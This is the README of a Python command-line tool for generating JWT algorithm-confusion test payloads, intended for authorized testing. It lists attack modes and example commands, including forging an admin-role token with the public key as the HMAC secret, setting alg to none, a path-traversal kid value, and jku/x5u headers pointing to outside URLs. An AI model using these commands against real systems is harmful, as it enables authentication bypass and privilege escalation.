# Confusional

Confusional is a Python command-line tool for generating JWT algorithm confusion test payloads. It is designed for education, lab work, and authorized security assessments where you need to validate whether a JWT implementation accepts unsafe header or signing combinations.

Use this only against systems you own or have explicit written permission to test.

![image](https://github.com/user-attachments/assets/ac470f1f-a263-4f1a-b710-3ecb790101c3)

## What It Tests

- HMAC algorithm confusion: signs with `HS256`, `HS384`, or `HS512` while using supplied key material as the HMAC secret.
- `none` algorithm handling: changes the token algorithm to `none` and removes the signature.
- `kid` manipulation: sets a controlled `kid` header value.
- JWK URL injection: adds a `jku` header value, optionally with a generated public JWK hint.
- Embedded JWK: generates an RSA key pair, embeds the public JWK in the header, and signs with the generated private key.
- X.509 URL injection: adds an `x5u` header value.
- Key confusion: advertises `RS256` while signing with an HMAC SHA-256 signature.

## Features

- Decode and inspect JWT header and payload.
- Modify payload claims with `key=value` syntax.
- Modify header values with `key=value` syntax.
- Parse booleans, numbers, nulls, JSON objects, and JSON arrays from CLI values.
- Adjust `exp`, `nbf`, and `iat` by relative seconds, such as `exp=+3600`.
- Read tokens from a file and write generated tokens to a file.
- Print raw token output for scripting.

## Requirements

- Python 3.10 or newer recommended.
- No required third-party dependency for the core HMAC, `none`, `kid`, `jku`, `x5u`, and key-confusion modes.
- Optional: `cryptography` for generated RSA key support.

Install the optional dependency:

```bash
python -m pip install cryptography
```

## Installation

```bash
git clone https://github.com/RemmyNine/Confusional
cd Confusional
python jwt_confusion.py --help
```

## Usage

```bash
python jwt_confusion.py --token <JWT> --attack <attack> [options]
```

Common options:

| Option | Description |
| --- | --- |
| `--token`, `-t` | JWT to process. Required unless `--file` is used. |
| `--file`, `-f` | Read the JWT from a file. |
| `--attack` | Attack mode: `hmac`, `none`, `kid`, `jwk-injection`, `embedded-jwk`, `x5u`, or `key-confusion`. |
| `--key`, `-k` | Key material used by key-based attacks. Required for `hmac` and `key-confusion`. |
| `--algorithm`, `-a` | HMAC algorithm for `hmac`: `HS256`, `HS384`, or `HS512`. |
| `--modify`, `-m` | Modify a payload claim. Can be repeated. |
| `--header` | Modify a header field. Can be repeated. |
| `--kid-value` | Header `kid` value for the `kid` attack. |
| `--jwk-url` | URL used for `jku` or `x5u` header attacks. |
| `--gen-key` | Generate and embed a public JWK hint for `jwk-injection`. |
| `--print-decoded`, `-p` | Decode the original token and exit. |
| `--raw-token` | Print only the generated token. |
| `--output`, `-o` | Write the generated token to a file. |
| `--verbose`, `-v` | Print decoded token details and modifications. |

## Examples

Decode a token:

```bash
python jwt_confusion.py --token "<JWT>" --print-decoded
```

Switch an RSA token to HMAC using the public key bytes as the HMAC secret:

```bash
python jwt_confusion.py --token "<JWT>" --key public.pem --attack hmac --algorithm HS256
```

Change claims while generating an HMAC confusion token:

```bash
python jwt_confusion.py --token "<JWT>" --key public.pem --attack hmac -m role=admin -m exp=+3600
```

Generate a token with `alg` set to `none`:

```bash
python jwt_confusion.py --token "<JWT>" --attack none --raw-token
```

Set a suspicious `kid` value:

```bash
python jwt_confusion.py --token "<JWT>" --attack kid --kid-value ../../../../../dev/null
```

Inject a JWK Set URL:

```bash
python jwt_confusion.py --token "<JWT>" --attack jwk-injection --jwk-url https://example.test/jwks.json
```

Generate and embed a public JWK hint in the header:

```bash
python jwt_confusion.py --token "<JWT>" --attack jwk-injection --gen-key
```

Generate an embedded JWK token signed with a generated RSA private key:

```bash
python jwt_confusion.py --token "<JWT>" --attack embedded-jwk
```

Add an `x5u` certificate URL:

```bash
python jwt_confusion.py --token "<JWT>" --attack x5u --jwk-url https://example.test/cert.pem
```

Generate a key-confusion payload:

```bash
python jwt_confusion.py --token "<JWT>" --attack key-confusion --key symmetric.key
```

Read from and write to files:

```bash
python jwt_confusion.py --file token.txt --key public.pem --attack hmac --output forged.txt
```

## Development

Run the test suite:

```bash
python -m unittest -v
```

Run a syntax check:

```bash
python -m py_compile jwt_confusion.py test_jwt_confusion.py
```

## Notes

This tool creates test payloads. A generated token is useful only when the target JWT implementation is vulnerable to the specific behavior being tested. Modern JWT libraries should pin accepted algorithms server-side, reject `none` unless explicitly intended, avoid trusting attacker-controlled key URLs, and validate key type against the selected algorithm.
